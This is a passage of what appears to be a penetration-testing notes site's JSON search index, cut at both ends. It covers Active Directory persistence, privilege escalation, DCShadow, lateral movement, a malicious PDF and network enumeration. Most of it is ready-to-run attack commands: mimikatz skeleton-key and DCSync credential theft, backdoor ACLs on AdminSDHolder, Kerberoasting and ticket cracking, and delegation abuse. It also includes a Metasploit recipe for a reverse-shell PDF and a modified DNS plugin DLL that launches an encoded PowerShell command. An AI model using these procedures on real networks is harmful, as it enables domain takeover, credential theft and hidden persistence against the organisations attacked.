Notes: Its not probably that a enterprise reboot the DC or kill lsass process. To execute this technique domain admin privilegs are required. Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName dc01.corp.local So it is possible to access any machine with a valid username and mimikatz as password. Enter-PSSession -ComputerName dc01.corp.local -Credential corp\\Administrator Note: In the skeleton key attack both passwords work at the same time, the actual password and mimikatz as password. In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver mimidriv.sys on disk of the target dc. Be careful this would be very noisy in logs. mimikatz# privilege::debug mimikatz# !+ mimikatz# !processprotect process:lsass.exe remove mimikatz# misc::skeleton mimikatz# !- The DC can not be patched twice. Directory Services Restore Mode (DSRM) There is a local administrator on every domain controlled called “Administrator” whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed. We only need to dump the DSRM password: Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -ComputerName dc01 We can compare the Administrator hash with the Administrator hash with the following command: Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' -ComputerName dc01 Since we have the NTLM hash, we can pass the hash to authenticate. But, the Logon Behaviour for the DSRM account needs to be changed before we can use its hash. Enter-PSSession -ComputerName dc01 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehaviour\" -Value 2 -PropertyType DWORD Note: If we get an error such as “New-ItemProperty: The property already exists” you need to modify it. Get-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" Set-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehaviour\" -Value 2 Over PassTheHash Invoke-Mimikatz -Command '\"sekurlsa::pth domain:dc01 user:Administrator ntlm:a9b30e5b0dc865eadcea9411e4ade72d run:powershell.exe' ls \\\\dc01\\c$ Custom Security Support Provider (SSP) A security support provider is a dll which provides ways for an application to obtain an authenticated connection. Some SSP packages by microsoft are NTLM, kerberos, CredSSP… Mimikatz provides a custom SSP named mimilib.dll. This SSP logs everly local logon, service account and machine account in plain text on the target server. We can abuse in two different ways: Dropping the mimilib.dll to system32 and add mimilib to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages: $packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages' $packages += \"mimilib\" Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name 'Security Packages' -Value $packages Inject into lsass using mimikatz (not stable with Server 2016): Invoke-Mimikatz -Command '\"misc::memssp\"' All local logons on the domain controller are logged to C:\\Windows\\system32\\kiwissp.log. Using ACLs (AdminSDHolder) Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the protected groups. Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL. List of protected groups and how can be abused some of them can log on locally to the domain controller: Account Operators: Can modify nesteg groups. Bakup Operators: Backup GPO, edit ato add SID of controller account to a privileged gorup and restore. Server Operators: Run a command as system Print Operators: Copy ntds.dit backup, load device drivers. Domain Admins: Can log on. Replicator: Can log on. Enterprise Admins: Can log on. Domain Controllers: Can log on. Read-only Domain Controllers: Can log on. Schema Admins: Can log on. Administrators: Can log on. With Domain Admin privileges which means that we have full control and write permissions on the AdminSDHolder object, this full control can be abused to create a backdoor or persistence mechanism by adding a user with Full Permissions to the AdminSDHolder object. In 60 minutes when the SDPROP is runned, the user will be added with Full Control access to the ACL of gropus like Domain Admins without actually being a member of it. Fist we need to add full controll permissions fo a user to the AdminSDHolder: PowerView: Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user1 -Rights All -Verbose ADModule: Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -Principal user1 -Verbose Note: Other interesing permissions for a user to the AdminSDHolder: ResetPassword, WriteMembers. After 60 minutes the ACL will be propagated automatically to the domain. It can be also posible to propagate it manually with Invoke-SDPropatagor.ps1 $sess = New-PSSession -ComputerName dc01.corp.local Invoke-Command -FilePath .\\Invoke-SDPropagator.ps1 -Session $sess Enter-PSSession -Session $sess And on the DC: Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose To check the Domain Admin Permissions as normal user: PowerView: Get-ObjectACL -SamAccountName \"Domain Admins\" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'} ADModule: (Get-Acl -Path 'AD:\\CN=Domain Admins,CN=Users,DC=corp,DC=local').Access | ?{$_.IdentityReference -match 'user1'} Note: GenericAll means that has FullControl to an object. Finally we just need to abuse it. Abusing FullControl ACL PowerView: Add-DomainGroupMember -Identity 'Domain Admins' -Members user2 -Verbose ADModule: Add-ADGroupMember -Identity 'Domain Admins' -Members user2 -Verbose Abusing ResetPassword ACL PowerView: Set-DomainUserPassword -Identity user2 -AccountPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Verbose ADModule: Set-ADACcountPassword -Identity user2 -NewPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Verbose Abusing FullControl ACL in domain root There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl. First, add full control rights: PowerView: Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights All -Verbose ADModule: Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -Verbose Abusing DCSync in domain root There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run DCSync. PowerView: Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights DCSync -Verbose ADModule: Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -GUIDRight DCSync -Verbose Note: There are three special rights which are required to DCSync: Replicating Directory Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set. And then execute DCSync: Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\krbtgt\"' Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\Administrator\"' So once we have obtained the hash NTLM of any user of the domain, PassTheHash or Over-PassTheHash attack can be executed. Security Descriptors It is possible to modify Security Descriptors such as security information like owner, primary group, DACL and SACL of multiple remote access methods to allow access to non-admin users. It is a very useful backdoor mechanism but administrative privileges are required. Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL. ace\\_type;ace\\_flags;rights;object_guid;inherit\\_object\\_guid;account\\_sid ACE for built-in administrators for WMI namespaces A;CI;CCDCLCSWRPWPRCWD;;;&lt;SID&gt; WMI ACLs can be modified to allow non-admin users access to securable objects with Set-RemoteWMI.ps1: Import-Module .\\Set-RemoteWMI.ps1 Set-RemoteWMI -UserName user1 -Verbose Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\\cimv2' -Verbose Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -Credential Administrator -namespace 'root\\cimv2' -Verbose And to remove permissions: Set-RemoteWMI -UserName user1 -ComputerName dc01.corp.local -namespace 'root\\cimv2' -Remove -Verbose PowerShell Remoting Something similar we can do it with PowerShell Remoting with the script Set-RemotePSRemoting.ps1. Import-Module .\\Set-RemotePSRemoting.ps1 Set-RemotePSRemoting -UserName user1 -Verbose Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Verbose Set-RemotePSRemoting -UserName user1 -ComputerName dc01.corp.local -Remove Remote Registry Using DAMP we can modify the registry with administrative privileges. On a remote machine with Add-RemoteRegBackdoor.ps1 script. Import-Module .\\Add-RemoteRegBackdoor.ps1 Add-RemoteRegBackdoor -ComputerName dc01.corp.local -Trustee user1 -Verbose After that we can execute some interesting attacks such as getting accounts and machines hashes. Retrive machine account hash: Import-Module .\\Get-RemoteMachineAccountHash Get-RemoteMachineAccountHash -ComputerName dc01.corp.local -Verbose Retrieve local account hash: Import-Module .\\Get-RemoteLocalAccountHash Get-RemoteLocalAccountHash -ComputerName dc01.corp.local -Verbose Retrive domain cached credentials: Import-Module .\\Get-RemoteCachedCredentials Get-RemoteCachedCredentials -ComputerName dc01.corp.local -Verbose"
					}

					
				
			
		
			
				
					,
					

					"active-directory-domain-privesc": {
						"id": "active-directory-domain-privesc",
						"title": "Domain Privilege Escalation",
						"category": "",
						"url": " /active-directory/domain-privesc/",
						"content": "Lets talk about some attacks to carry out a domain privilege escalation in order to obtain a Domain Controller. Attacking Kerberos Kerberoasting The Kerberos session ticket as known as TGS has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack. Note: Service accounts are many times ignored. Password are rarely changed and have privileged access. Getting the TGS First of all we need to find which users are used as Service Accounts: PowerView: Get-NetUser -SPN ADModule: Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName After enum it, we need to request a TGS: PowerView: Request-SPNTicket ADModule: Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc mgmt-user.corp.local\" Note: With klist you can check if the TGS has been granted. Finally all tickets should be exported. Inovoke-Mimikatz -Command '\"kerberos::list export\"' Cracking the tickets Once the tickets are exported it can be cracked with john, hashcat or tgsrepcrack.py tool: python.exe .\\tgsrepcrack.py wordlist.txt ticket.kirbi To crack the ticket with hascat exists a script to export it to a hashcat format. https: github.com jarilaos kirbi2hashcat haschat -a 0 -m 13100 wordlist.txt ticket.txt AS-REP Roasting If a users account does not have the flag “Do not require Kerberos pre-authentication” in UserAccountControl settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline. Users with No-Preauth set We need to enumerate accounts with Kerberos Preauth disabled: PowerView: Get-DomainUser -PreauthNotRequired -Verbose ADModule: Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth Note: With GenericAll or GenericWrite, kerberos preauth can be disabled. Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose Cracking the tickets We can request an encrypted AS-REP for offline brute-force. To do that task we can use ASREPRoast module: Import-Module ASREPRoast.ps1 Get-ASREPHash -UserName user01 -Verbose After getting the ticket we can crack it with john or hashcat: john user01.ticket --wordlist=wordlist.txt hashcat -a 0 -m 18200 user01.ticket wordlist.txt Set SPN With enough privileges such as GenericAll or GenericWrite, a target user’s SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted. We can enumerate the permissions for a group on ACLs: PowerView (dev): Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"} We can also see if a user already has a SPN: PowerView (dev): Get-DomainUser -Identity user01 | select serviceprincipalname ADModule: Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName And we can force the SPN to a user: PowerView (dev): Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops whatever01'} ADModule: Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops whatever01'} Once we have a SPN set, we can request a TGS: Add-Type -AssemblyName System.IdentityModel New-Object Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList \"ops whatever01\" And we can export the tickets to the disk: Inovoke-Mimikatz -Command '\"kerberos::list export\"' And finally same as Kerberoasting, you can crack the ticket with tgsrepcrack.py. Kerberos Delegation Kerberos Delegation allows to reuse the end-user credentials to access resources hosted on a different server. This is typically useful in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources on the database server as the user and not as the web server’s service account. Note: The service account for web service must be trusted for delegation to be able to make requests as a user. So the server can Impersonate the user. There are two types of delegation: Unconstrained Delegation When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user. When unconstrained delegation is enabled, the domain controller places uset’s TGT inside TGS. When that is presented to the server with unconstrained delegation, the TGT is extracted from TGS and sotred in LSASS. This way the server can reuse the user’s TGT to access any other resource as the user. Note: Allows the first hop server to request access to any service on any computer in the domain. We need to discover computers which have unconstrained delegation enabled. PowerView: Get-NetComputer -UnConstrained ADModule: Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True} Note: The DC always have the unconstrained delegation enabled. To exploit the unconstrained delgation and extract the user’s TGT from lsass, we need to compromise the server as local admin. Invoke-Mimikatz -Command '\"sekurlsa::tickets export\"' If any interesting ticket is located on the server, we will need to wait until a interesting user connects to the compromised server. We can use Invoke-UserHunter to see if the targeted user connects to the server: Invoke-UserHunter -ComputerName srv01 -Poll 100 -UserName Administrator -Delay 5 -Verbose If we find a interesting ticket, it could be reused using PassTheTicket: Invoke-Mimikatz -Command '\"kerberos::ptt ticket.kirbi\"' Constrained Delegation When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user. A typical scenario where constrained delegation is userd is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user’s authorization. Note: Allows the first hop server to request access only to specified services on specified computers. To impersonate the user, Service for user as known as S4U extension is used which provides two extensions: Service for User to Self (S4U2self): Allows a service to obtain a forwardable TGS to itself on behalf a user with just the user principal name without supplying a password. The service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION (T2A4D UserAccountControl attribute). Service for User to Proxy (S4U2proxy): Allows a service to obtain a TGS to a second service on behalf of a user. The attribute msDS-AllowedToDelegate attribute contains a list of SPNs to which the user tokens can be forwarded. To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the web service accoutn as any user. PowerView Dev: Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth ADModule: Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo We can use asktgt from kekeo to request a TGT. .\\kekeo.exe tgt::ask user:websvc domain Once we have the TGT, with kekeo we can request a TGS. tgt::s4u tgt:TGT_websvc@CORP.LOCAL_krbtgt~corp.local@corp.local.kirbi user:Administrator@corp.local service:cifs mssql.corp.local Finally with mimikatz we can inject the ticket on the current session: Invoke-Mimikatz -Command '\"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL_cifs~mssql.corp.local@CORP.LOCAL.kirbi\"' Note: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified. DNSAdmins It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe which is NT AUTHORITY\\SYSTEM. In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service. Enumerate the DNSAdmins group: PowerView: Get-NetGroupMember -GroupName \"DNSAdmins\" ADModule: Get-ADGRoupMember -Identity DNSAdmins After compromise a member and from the privileges of DNSAdmins group, we can configure a dll: dnscmd.exe: dnscmd dc01 config serverlevelplugindll \\\\10.10.10.10\\share\\mimilib.dll DNSServer: $dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All $dnsettings.ServerLevelPluginDll = \"\\\\10.10.10.10\\share\\mimilib.dll\" Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose We need to restart the service: sc \\\\dc01.corp.local stop dns sc \\\\dc01.corp.local start dns By default mimilib.dll logs all DNS queries on the following file: c:\\windows\\sytem32\\kiwidns.log We can modify the source code of kdns.c from mimikatz in order to add a reverse shell or other type of backdoor. #pragma warning(disable:4996) if(kdns_logfile = _wfopen(L\"kiwidns.log\", L\"a\")) #pragma warning(pop) { klog(kdns_logfile, L\"%S (%hu)\\n\", pszQueryName, wQueryType); fclose(kdns_logfile); system(\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==\") THIS LINE } return ERROR_SUCCESS;"
					}

					
				
			
		
			
				
					,
					

					"active-directory-forest-persistence": {
						"id": "active-directory-forest-persistence",
						"title": "Forest Persistence",
						"category": "",
						"url": " /active-directory/forest-persistence/",
						"content": "We are going to discuss some ways to do a persistence in a forest root. DCShadow DCShadow temporaly registers a new DC in the target domain and uses it to push attributes like SID History, SPNs and more over on the specified object without leaving the cange logs for modified object. The new domain controller is registered by modifying the configuration container, SPNs of an exisiting computer object and couple of RPC services. Due to the attributes are changed from a domain dontroller, there are no directory change logs on the actual DC for the target object. By default, domain administrative privileges are required to use DCShadow. To execute this persistence we need to use two isntances of mimikatz. The first one starts RPC servers with SYSTEM privileges and specify attributes to be modified: !+ !processtoken lsadump::dcshadow object:root1user attribute:Description value=\"Hello from DCShadow\" And the second one with enough privileges, such as DA, will push the values: lsadump::dcshadow push Note: DCShadow can be used with minimal permissions by modifyng ACLs, Nishang has a script to set this permissions to a user. Set-DCShadowPermissions -FakeDC machine-user01 -SAMAccountName root1user -Username user01 -Verbose Set Primary Group ID to Enterprise Admin Now that we have been discovered how to overwrite attributes of users, we can change the group id of a user to the id of the enterprise administrators or domain admins. lsadump::dcshadow object:user01 attribute:primaryGroupID value:519 Note: This makes noise, because every one who looks net group \"Enterpise Admins\" domain will see that the user user01 is a member. Modify ntSecurityDescriptor for AdminSDHolder We can modify the ntSecurityDescriptor for AdminSDHolder to add full control for a user. (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=AdminADHolder,CN=System,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl We just need to append a full control ACE from above DA with our users SID. lsadump::dcshadow object:CN=AdminSDHolder,CN=System,DC=corp,DC=local attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Modified ACL: ORIGINAL ACL + FULL CONTROL FOR OUR USER 0:DAG:DAD:PAI(A;;LCRPLORC;;;AU) ..................... (A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323) Note: We just need to add our SID to the SY BA DA ACE result. To see the SID we can use: Get-NetUser user01 Shadowception We can even run DCShadow from DCShadow. To do that task we will add 4 ACL and add the following content: Note We can use stack to stack multiple ACL. Domain Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;&lt;USER SID&gt;) (OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;&lt;USER SID&gt;) (OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshado stack object:DC=corp,DC=local attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Attacker Computer Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=machine01,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (A;;WP;;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshado stack object:machine01$ attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Target User Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=user01,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (A;;WP;;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshado stack object:targetuser01 attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Sites Configuration Object List ACL: (New-Object System.DirectoryServices.DirectoryEntry(\"LDAP: CN=Sites,CN=Configuration,DC=corp,DC=local\")).psbase.ObjectSecurity.sddl Append the following ACE: (A;CI;CCDC;;;&lt;USER SID&gt;) Stack the ACL lsadump::dcshado stack object:CN=Sites,CN=Configuration,DC=corp,DC=local attribute:ntSecurityDescriptor value:&lt;MODIFIED ACL&gt; Finally we just start the server: lsadump::dcshadow And on the other session with DA privileges: lsadump::dcshadow push"
					}

					
				
			
		
			
				
					,
					

					"active-directory-lateral-movement": {
						"id": "active-directory-lateral-movement",
						"title": "Lateral Movement",
						"category": "",
						"url": " /active-directory/lateral-movement/",
						"content": "PowerShell Remoting Once a machine is compromised, we need to jump to others in order to find more valuable targets. For that task we can use PowerShell Remoting which is increasingly used in enterprises and enabled by default on Server 2012 onwards. PowerShell Remoting uses WinRM protocol, so you can check evil-winrm tool. Admin privileges on the target machineis needed. Note: Maybe you need to enable remoting Enable-PSRemoting on a Desktop windows machine and Admin privs are required. You can get a elevated shell (NT AUTHORITY\\SYSTEM) on the remote server if the credentials of the user administrator are used to authenticate (default setting). Creating a Session There are two types of PowerShell Remoting: One-to-One: It is interactively login to another machine. Create a new session on the target machine so runs in a new process (wsmprovhost). Enter-PSSession -ComputerName machine01.corp.local We can also first create the session and append to it later. $sess = New-PSSession -ComputerName machine01.corp.local Enter-PSSession -Session $sess Note: We can put a session in background if the session is stored in a variable. Very useful. One-to-Many: It is also known as Fan-out remoting. It is a non-interactive shell but we can execute commands parallely. Is useful to run commmands and scripts on multiple remote computers, in disconnected sessions and as a background job. Invoke-Command -ComputerName machine01.corp.local -ScriptBlock {whoami;hostname} Invoke-Command -ComputerName (Get-Content .\\servers.txt) Invoke-Command -ComputerName machine01.corp.local -FilePath .\\file.ps1 Note: One of the best things in PowerShell to do PassTheHash, using credentials and executing commands on multiple remote computers. RedTeam Note: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine. PowerShell Constrained Language Mode ByPass By default PowerShell Remote run the script in a ConstrainedLanguage mode so we can not run some cmdlets which are considered to be unsafe. To check the type of language run the following command: $ExecutionContext.SessionState.LanguageMode Enabling constrained language mode, that dows not allow powershell execute complex ataccks such as mimikatz. [Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘) However, if you have access to the system and enough privileges to change environment variables, you can bypass it by removing the variable __PSLockdownPolicy and re-spawning another PowerShell instance. PowerShell Downgrade If PowerShell 2.0 is installed we can bypass it via spawning a PowerShell 2.0 instance. powershell -version 2 https: www.ired.team offensive-security code-execution powershell-constrained-language-mode-bypass Execute locally loaded funcitons on the remote machine We can execute locally loaded function on the remote machine. Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content .\\servers.txt) Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ArgumentList \"-List hello\" -ComputerName (Get-Content .\\servers.txt) Load a script remotely we can load a script remotely. Invoke-Command -FilePath .\\hello.ps1 -Session $sess Enter-PSSession -Session $sess [machine01.corp.local]: PS C:\\&gt; hello Hello World! Execute “Stateful” commands We can execute “Stateful” commands. $sess = New-PSSession -ComputerName server1 Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process} Invoke-Command -Session $sess -ScriptBlock {$proc.Name} Dump credentials Once we have administrator privileges on the target machine we can dump credentials with Invoke-Mimikatz. See this section: https: mvc1009.github.io hackingnotes post-exploitation get-credentials . To avoid save mimikatz on disk we need to load remotely. Invoke-Command -FilePath .\\Invoke-Mimikatz.ps1 -Session $sess Invoke-Command -Session $sess -ScriptBlock {Invoke-Mimikatz -DumpCreds} Or we can execute locally loaded functions. . .\\Invoke-Mimikatz.ps1 Invoke-Command -Session $sess -ScriptBlock {function:Invoke-Mimikatz -DumpCreds} Over-Pass-the-Hash Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash. Invoke-Mimikatz -Command '\"sekurlsa::pth usr:Administrator domain:corp.local ntlm:&lt;ntlmhash&gt; run:powershell.exe\"'"
					}

					
				
			
		
			
				
					,
					

					"client-side-attacks-evil-pdf": {
						"id": "client-side-attacks-evil-pdf",
						"title": "Evil PDF",
						"category": "",
						"url": " /client-side-attacks/evil-pdf/",
						"content": "An Evil PDF is a pdf with malware inside. Introduction PDF, or Portable Document Format, is an extraordinarily intricate file format, represented by numerous models and semi-principles. Like HTML and CSS, it was intended for document layout and introduction. Additionally, like HTML and CSS, it has been expanded with a JavaScript motor and document API that enables developers to transform PDF reports into applications — or agents for malware. Among the most generally utilized Adobe items is Reader. Almost every PC has some variant of Adobe Reader on it for perusing PDFs. You presumably have it, as well. However, most people are ignorant of the security issues that Reader has encountered — and they neglect to upgrade or fix it. Creating the Evil PDF file I will use meterpreter to compromise the client and get a reverse shell. msf6 &gt; use exploit windows fileformat adobe_pdf_embedded_exe We need to set some variables: set FILENAME Not_Evil.pdf set INFILENAME root Downloads ESP8266_datasheet.pdf set LAUNCH_MESSAGE Couldn't open PDF: Something's keeping this PDF from opening set LPORT &lt;port&gt; set LHOST &lt;ip&gt; set PAYLOAD windows shell_reverse_tcp run Finally a PDF is created with malware. A reverse shell will be prompted once the victim execute the file with an outdated Adobe Reader. References https: medium.com purple-team embedding-backdoor-into-pdf-files-1781dfce62b1"
					}

					
				
			
		
			
				
					,
					

					"client-side-attacks-microsoft-office-macros": {
						"id": "client-side-attacks-microsoft-office-macros",
						"title": "Microsoft Office Macros",
						"category": "",
						"url": " /client-side-attacks/microsoft-office-macros/",
						"content": ""
					}

					
				
			
		
			
				
					,
					

					"enumeration-dns-enumeration": {
						"id": "enumeration-dns-enumeration",
						"title": "DNS Enumeration",
						"category": "",
						"url": " /enumeration/dns-enumeration/",
						"content": "The Domain Name System (DNS) is on of the most critical systems on the Internet and is a distributed database responsible for translating user-friendly domain names into IP addresses. Interacting with DNS servers DNS queries produce listintgs calles Resource Records. This is a representation of Resource Records: DNS Lookup A DNS lookup is the simplest query a DNS server can receive. Its asks the DNS to resolve a given hostname. nslookup [Domain] dig [Domain] host [DOMAIN] Once we retrieved all the IP addresses corresponding to the domains, we need to consider two things: Is this IP address hosting only that given domain? It is possible that more than one domain is configured on the same IP address, even if a PTR record is not set. This is also typical in corporate networks where multiple subdomains run on the same web server. First thing to try is reverse lookup and the second is search on google or bing: bing&gt; ip:[IP] Who does this IP address belongs to? To search the owner of an IP address we can use whois.arin.net or one of the WHOIS tools seen earlier In order to collect the highest number of domains and subdomain related to the target organization, we can use different techniques: DNS Lookup MX Lookup Zone transfers Reverse DNS Lookup With Reverse DNS Lookup, we will recieve the IP address associated to a given domain name. This process queries for DNS pointer records (PTR). nslookup -type=PTR [IP] dig [Domain] PTR or use online tools: https: network-tools.com nslookup Mail Exchange Lookup With MX(Mail Exchange) lookup, we retrieve a list of servers responsible for delivering emails for that domain: nslookup -type=MX [Domain] dig [Domain] MX or use online tools: https: www.dnsqueries.com https: www.mxtoolbox.com Zone Transfers Zone transfers are usually a misconfiguration of the remote DNS server. They should be enabled only for trusted IP addresses. Whe zone transfers are enabled, we can enumerate the entire DNS record for that zone. This includes all the sub domains (A records). nslookup -type=NS [Domain] dig [Domain] NS host -t ns [Domain] There are usually two name servers. Take note of both of them an run the next command to show all A records: nslookup -query=AXFR [Domain] [Nameserver] dig axfr [Nameserver] [Domain] host -l [Domain] [Nameserver] dnsrecon -d [Domain] -axfr Another technique to discover A records if Zone transfers are well configured is to bruteforce them with a most common subdomain names: fierce -dns [Domain] -dnsserver [Nameserver] -f [Wordlist] dnsmap [Domain] dnsrecon -d [Domain] -D [Wordlist] -t brt"
					}

					
				
			
		
			
				
					,
					

					"enumeration-host-discovery": {
						"id": "enumeration-host-discovery",
						"title": "Host Discovery",
						"category": "",
						"url": " /enumeration/host-discovery/",
						"content": "When we have our pool of IP addresses, we have to identify the devices and the roles played by each IP in the target organization. Live Hosts There are different methods that one can use to identify live hosts. ICMP Ping Sweep The most common is the ICMP ping sweep. It consists of ICMP ECHO requests sent to multiple hosts. If a given host is alive, it will return an ICMP ECHO reply. fping -a -g [IP-Range] [Mask] nmap -sn [IP-Range] [Mask] -oG ping-sweep.nmap grep \"Up\" ping-sweep.nmap | cut -d \" \" -f 2 Note: For internal Audits, when a host reply a ping shown by fping and doesn’t reply for nmap command this could be a router or switch. Other technic to detect live hosts with ICMP Ping sweep is with this script: #! bin bash for i in $(seq 1 255); do timeout 1 bash -c \"ping -c 1 10.10.10.$i\" &gt; dev null &amp;&amp; echo \"10.10.10.$i - Active\" &amp; done; wait Most common ports The second technique is doing a most common port scanner with the following ports: 22 - SSH 80 - HTTP 443 - HTTPS 445 - SMB nmap -p 22,445,80,443 [IP-Range] [Mask]"
					}

					
				
			
		
			
				
					,
					

					"enumeration-os-discovery": {
						"id": "enumeration-os-discovery",
						"title": "OS Discovery",
						"category": "",
						"url": " /enumeration/os-discovery/",
						"content": "Some tips to discover the operative system that runs on the target machine. TTL The default values of TTL on a ICMP packet, shown in the following table, can help us to identify the operative system: Operative System TTL Windows 128 Linux 64 Solaris AIX 254 OpenBSD 255 FreeBSD 5.0 64 FreeBSD 3.4, 4.0 255 Cisco 254 The following example is for a Linux device: ❯ ping localhost PING localhost(localhost (::1)) 56 data bytes 64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.053 ms 64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.051 ms"
					}

					
				
			
		
			
				
					,
					

					"enumeration-port-scanning": {
						"id": "enumeration-port-scanning",
						"title": "Port Scanning",
						"category": "",
						"url": " /enumeration/port-scanning/",
